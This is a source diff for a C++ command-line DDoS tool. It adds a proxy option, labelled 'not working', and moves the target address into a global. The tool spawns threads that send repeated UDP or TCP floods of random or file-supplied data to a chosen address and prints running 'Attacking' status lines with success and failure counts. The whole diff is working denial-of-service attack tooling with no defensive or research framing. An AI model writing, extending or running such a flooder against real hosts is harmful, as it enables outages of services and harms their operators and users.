@@ -13,11 +13,12 @@
              "\n" COLOR_RESET COLOR_YELLOW                                                                                                  \
              "Options:\n"                                                                                                                   \
              " --method|-m    <method>    ddos method\n"                                                                                    \
-             " --target|-t    <target>    target url\n"                                                                                     \
+             " --target|-t    <target>    target address\n"                                                                                 \
              " --threads|-T   <threads>   threads count\n"                                                                                  \
              " --amplifier|-a <amplifier> in-thread requests count\n"                                                                       \
              " --data|-d      <file>      send data from file\n"                                                                            \
-             " --debug|-D                 toggle debug printing" COLOR_RESET "\n"
+             " --debug|-D                 toggle debug printing\n"                                                                          \
+             " --proxy|-p     <proxy>     proxy address (not working)" COLOR_RESET "\n"
 
 
 static const char* appname;
@@ -28,8 +29,10 @@ static int failed_requests = 0;
 static size_t amplifier = 0;
 static std::string method;
 static bool debug = false;
+static net::inet_address* target_address = nullptr;
+static net::inet_address* proxy_address = nullptr;
 
-static constexpr const char* s_options = "m:t:T:a:d:D";
+static constexpr const char* s_options = "m:t:T:a:d:Dp:";
 const option l_options[]{
 		{"method",    required_argument, nullptr, 'm'},
 		{"target",    required_argument, nullptr, 't'},
@@ -37,7 +40,7 @@ const option l_options[]{
 		{"amplifier", required_argument, nullptr, 'a'},
 		{"data",      required_argument, nullptr, 'd'},
 		{"debug",     no_argument,       nullptr, 'D'},
-//		{"proxies",   required_argument, nullptr, 'p'},
+		{"proxy",     required_argument, nullptr, 'p'},
 		{nullptr}
 };
 
@@ -55,13 +58,12 @@ char* rand_bytes(size_t size)
 void* flood_thread(void* arg)
 {
 	::srandom(::time(nullptr));
-	auto address = *static_cast<net::inet_address*>(arg);
 	for (size_t i = 0; i < amplifier; ++i)
 	{
 		if (method == "UDP" || method == "udp")
 		{
 			method = "UDP";
-			net::udp_flood flood(address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), debug);
+			net::udp_flood flood(*target_address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), proxy_address, debug);
 			if (flood)
 				++sent_requests;
 			else
@@ -70,7 +72,7 @@ void* flood_thread(void* arg)
 		else // tcp
 		{
 			method = "TCP";
-			net::tcp_flood flood(address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), debug);
+			net::tcp_flood flood(*target_address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), proxy_address, debug);
 			if (flood)
 				++sent_requests;
 			else
@@ -85,7 +87,6 @@ int main(int argc, char** argv)
 {
 	appname = argv[0];
 	
-	net::inet_address* address = nullptr;
 	int longid;
 	int opt;
 	size_t threads_count = 0;
@@ -106,7 +107,7 @@ int main(int argc, char** argv)
 			{
 				auto addr_str = std::string(optarg);
 				for (char& i: addr_str) i = std::tolower(i);
-				address = new net::inet_address(addr_str);
+				target_address = new net::inet_address(addr_str);
 				break;
 			}
 			
@@ -134,6 +135,14 @@ int main(int argc, char** argv)
 				break;
 			}
 			
+			case 'p':
+			{
+				auto addr_str = std::string(optarg);
+				for (char& i: addr_str) i = std::tolower(i);
+				proxy_address = new net::inet_address(addr_str);
+				break;
+			}
+			
 			default: // '?'
 			{
 				::printf(HELP, appname);
@@ -143,9 +152,11 @@ int main(int argc, char** argv)
 	}
 	
 	if (debug)
-		std::cout << COLOR_YELLOW COLOR_FAINT << "threads_count = " << threads_count << " amplifier = " << amplifier << COLOR_RESET "\n";
+		std::cout << COLOR_YELLOW COLOR_FAINT << "threads_count = " << threads_count << "  amplifier = " << amplifier
+				  << "  proxy = " << (proxy_address ? proxy_address->get_ip() : "<NULL>") << ":" << (proxy_address ? proxy_address->get_port() : 0)
+				  << COLOR_RESET "\n";
 	
-	if (!method.empty() && address && threads_count && amplifier)
+	if (!method.empty() && target_address && threads_count && amplifier)
 	{
 		char* data = nullptr;
 		if (!data_file.empty())
@@ -190,7 +201,7 @@ int main(int argc, char** argv)
 		{
 			++running_threads;
 			pthread_t thread;
-			::pthread_create(&thread, nullptr, flood_thread, address);
+			::pthread_create(&thread, nullptr, flood_thread, nullptr);
 			::pthread_detach(thread);
 		}
 		
@@ -199,11 +210,16 @@ int main(int argc, char** argv)
 			::printf(
 					COLOR_RESET "Attacking " COLOR_INTENSE COLOR_BLUE "%s" COLOR_WHITE ":" COLOR_YELLOW "%hu" COLOR_RESET " | method " COLOR_MAGENTA
 					"%s" COLOR_RESET " | successes " COLOR_GREEN "%d" COLOR_RESET " | fails " COLOR_RED "%d" COLOR_RESET " | running threads %d\n",
-					address->get_ip().c_str(), address->get_port(), method.c_str(), sent_requests, failed_requests, running_threads
+					target_address->get_ip().c_str(), target_address->get_port(), method.c_str(), sent_requests, failed_requests, running_threads
 			);
 			::sleep(1);
 			::srandom(::clock());
 		}
+		::printf(
+				COLOR_RESET "Attacking " COLOR_INTENSE COLOR_BLUE "%s" COLOR_WHITE ":" COLOR_YELLOW "%hu" COLOR_RESET " | method " COLOR_MAGENTA
+				"%s" COLOR_RESET " | successes " COLOR_GREEN "%d" COLOR_RESET " | fails " COLOR_RED "%d" COLOR_RESET " | running threads %d\n",
+				target_address->get_ip().c_str(), target_address->get_port(), method.c_str(), sent_requests, failed_requests, running_threads
+		);
 		::exit(0);
 	}
 	::printf(HELP, appname);
